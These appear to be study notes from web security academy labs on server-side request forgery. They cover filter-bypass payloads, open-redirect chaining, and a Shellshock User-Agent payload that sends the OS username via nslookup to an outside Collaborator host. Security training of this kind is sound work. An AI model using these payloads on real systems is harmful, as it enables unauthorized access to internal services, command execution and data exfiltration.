# What is SSRF
- Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.
- **IMPACT:** A successful SSRF attack can often result in unauthorized actions or access to data within the organization. In some sitations arbitrary command execution

# Common SSRF attacks
- Example(LAB): Application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs.
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

#stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
stockApi=http://localhost:8080/admin  ### WE MODIFIED TO THIS
```
  - An attacker can visit the /admin URL, but the administrative functionality is normally only accessible to authenticated users. This means an attacker won't see anything of interest. However, if the request to the /admin URL comes from the local machine, the normal access controls are bypassed.

## SSRF with blacklist-based input filters
- It is common to see applications containing SSRF behavior together with defenses aimed at preventing malicious exploitation. Often, these defenses can be circumvented.
1. Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
2. Obfuscate blocked strings using URL encoding or case variation. Use double encoding
3. Switching from an http: to https: URL
- **_LAB_**: `stockApi=http://127.1/%2561dmin/delete?username=carlos` We double encode 'a' character and bypass filter

## SSRF with whitelist-based input filters
1. You can embed credentials in a URL before the hostname, using the `@` character. For example:
`https://expected-host:fakepassword@evil-host`
2. You can use the `#` character to indicate a URL fragment. For example:
`https://evil-host#expected-host`
3. You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
`https://expected-host.evil-host`
4. You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies

## Bypassing SSRF filters via open redirection
- For example, the application contains an open redirection vulnerability in which the following URL:
`/product/nextProduct?currentProductId=6&path=http://evil-user.net`
- **_LAB_**: We change path parametr and bypass URL filter
`stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin`

# Blind SSRF Vulnerabilities
- Blind SSRF vulnerabilities occur if you can cause an application to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.
- The impact of blind SSRF vulnerabilities is often lower than fully informed SSRF vulnerabilities because of their one-way nature. They cannot be trivially exploited to retrieve sensitive data from back-end systems
- Some situations they can be exploited to achieve full remote code execution.
- You use Burp Collaborator to find this Vulnerability

# Finding hidden attack surface for SSRF vulnerabilities
- **Partial URLs in requests**:
      - Full SSRF: where the full URL can be controlled.
      - Partial SSRF: where only part of the URL can be controlled, such as the path component of a URL to a hardcoded domain.
- **URLs within data formats**
- **SSRF via the Referer header**



# **_Expert Lab 1 (Blind SSRF with Shellshock exploitation)_**
- To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

- Burp Intruder Payload. nslookup to our Collaborator server, and get RCE username via SHELLSHOCK exploit
```
GET /product?productId=2 HTTP/2
Host: 0aa000910317124c8281e7da0046005f.web-security-academy.net
Cookie: session=aNbqFsUPwWizy1Lnlg6wz4lyAvnDwJjw
*** User-Agent: () { :; }; /usr/bin/nslookup $(whoami).446br5bs1ku9kd7q8o8zu50pngt7hx5m.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
*** Referer: http://192.168.0.ยง1ยง:8080/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

# _**Expert LAB 2 (SSRF with whitelist-based input filter)**_
- Response say that url shoul contain 'stock.weliketoshop.net'
- Then we add another url before actual url, `fake-url#@real-url`
- At the end we double encode # character and bypass filter
`http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
